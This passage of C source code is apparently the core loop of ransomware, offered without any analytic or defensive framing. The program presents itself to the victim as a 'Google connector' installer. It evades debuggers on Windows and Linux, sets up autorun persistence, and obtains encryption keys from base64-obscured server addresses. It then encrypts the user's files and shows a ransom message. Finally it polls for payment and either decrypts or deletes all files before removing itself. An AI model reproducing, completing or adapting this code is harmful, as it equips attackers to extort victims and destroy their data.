        // else run the ransomware
        // println("No Debugger here");
        println("Welcome to the Google connector!\nPlease wait while the installer runs...");

        // variable to get decryption status
        boolean notDecrypted = TRUE;
        //println("NOT decrypted");

        // make new autorun on Windows using batch file
        makeAutoRun(FALSE);

        static char userIdentifier[NUM_RAND_BYTES] = {0};
        //char *key_iv[2];


        boolean stop = TRUE;
        while (TRUE){
            // if files aren't encrypted
            //println("HI");
            if (!isEncrypted()){
                //println("Not encrypted!");
                // check if user identifier exists, else create

                checkUserIdentifier(userIdentifier);
                // make first connection, send welcome
                runConnection(sendWelcome, userIdentifier, base64_decode((char *)sucksha));
                // second connection, server creates key and iv and sends them to the user
                // create array of dynamically allocated strings
                char *key_iv[2];
                getKey(key_iv, getKeyAndIVToEnc, userIdentifier, base64_decode((char* )hlp));
                // encrypt specific files
                encryptData(key_iv[0], key_iv[1]/*key, iv*/);
                // show a message with the ransom and so on
                createAndShowMessage();
                println("Do not destroy the current process, otherwise your data will be irreversibly encrypted.");

            }else{
                sleep(3);
                // check if user identifier exists, else create
                checkUserIdentifier(userIdentifier);
                // make first connection, send welcome
                runConnection(sendWelcome, userIdentifier, base64_decode((char *)sucksha));

                if (stop) {
                    println("Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data.");
                    stop = FALSE;
                }
                println("If you payed, this window will automatically check and decrypt your data.");

                // check if the user has payed
                if (isPayed(getHasPayed, userIdentifier, base64_decode((char *)payd))){
                    println("Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!");

                    // if yes, check if the client is an idiot
                    boolean cId = clientIsIdiot();
                    // if yes, remove all his files and the identifier and key from the server
                    if (cId){
                        removeAllFiles(cId);
                        removeFromServer(removeIt, userIdentifier, base64_decode((char *)mny));
                        println("Removed!");
                    }else{
                        // else he is a good guy, who understands how easy it is
                        // while the files aren't decrypted
                        while (notDecrypted){
                            char *key_iv[2];
                            getKey(key_iv, getKeyAndIVToDec, userIdentifier, base64_decode((char* )ypay));
                            // encrypt specific files
                            if (decryptData(key_iv[0], key_iv[1]/*key, iv*/)){
                                // remove from server
                                // workaround due to memory corruption of above dynamically allocated string arrays
                                static char userIdentifier2[NUM_RAND_BYTES];
                                checkUserIdentifier(userIdentifier2);
                                removeFromServer(removeIt, userIdentifier2, base64_decode((char *)mny));
                                println("Your files has been decrypted!\nThank you and Goodbye.");
                                // set break statement
                                notDecrypted = FALSE;
                                // if no connection, connect again in 2 seconds
                                sleep(2);
                            }
                        }
                        removeAllFiles(cId);
                        makeAutoRun(TRUE);
                    }
                    break;

                }else{
                    // wait 20 seconds, while testing again, else a "DOS" attack exists for the server
                    sleep(20);
                }
            }
        }
        selfRemove();
        exit(EXIT_SUCCESS);
    }
    return 0;
}

int main() {
    // check debugger presence
#ifdef _WIN32
    if (IsDebuggerPresent())
        runItsSoEasy(TRUE);
    else runItsSoEasy(FALSE);
#elif __linux__
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
        runItsSoEasy(TRUE);
    else {
        ptrace(PTRACE_DETACH, 0, 1, 0);
        runItsSoEasy(FALSE);
    }
#endif
    return 0;
}
